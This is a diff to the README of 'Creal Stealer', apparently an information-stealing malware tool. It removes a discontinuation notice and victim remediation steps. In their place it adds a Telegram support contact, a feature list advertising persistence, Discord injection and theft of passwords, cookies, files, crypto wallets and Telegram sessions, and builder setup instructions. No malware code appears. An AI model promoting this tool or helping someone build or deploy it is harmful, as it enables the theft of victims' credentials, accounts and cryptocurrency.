@@ -1,36 +1,37 @@
 <h1 align="center"> Creal Stealer </h1> 
 <p align= "center"> <kbd> <img  src="https://i.pinimg.com/originals/f3/22/29/f3222920b0e592bfc0c60f7e56c4cc7d.gif"width="400"> </kbd><br><br>
 <p></p>
+<p> if you need help you can write on telegram. Click to write (https://t.me/crealdevelopment) </p>
 
 
+## Features:
+»Startup
 
-<h1>THE SOFTWARE WILL NOT RECEIVE ANY MORE UPDATE BECAUSE IT IS USED FOR ANY BAD PURPOSE</h1>
-<p>What to do if you have been a victim of someone using our software;
+»Discord injection
 
-Win + R + %appdata% /Microsoft/Windows/Start Menu/Programs/Startup 
+» Grab Discord Information and HQ Friends.
 
-if there is a foreign file in the folder delete it.
+» Grab Password & cookies.
 
-Win + R + %localappdata% /Discord/app-version/modules/discord_desktop_core-1/discord_desktop_core 
+» Grab Files.
 
-If the index.js file is larger than 1KB, right click the index.js file and open it with notepad and delete everything in it
+» Shows Crypto Wallets
 
+» Grab metamask/exodus
 
-A few things you can do to avoid being a victim;
+» Grab Telegram
 
-In our code, we have 2 list variables under the name of blacklist. If you put the names in the strings in the variable on your computer, the software will never run on your computer.
-
-Posting every file sent from a foreigner to the virustotal site like crazy
-
-Using your computer with Windows 11. If the person in front of you only knows how to use the software, no one can easily infect you if you are using windows 11.
-
-Adding 2FA verification to all your important accounts. This full time not working but can protect your account from being stolen.</p>
+» Grab chromium based Passwords
 
 
 ## Setup:
 first open `install.bat`
 
 and open `builder.bat`
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/builder.png"></img>
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/builder2.png"></img>
 
 ##  Manual Setup:
  
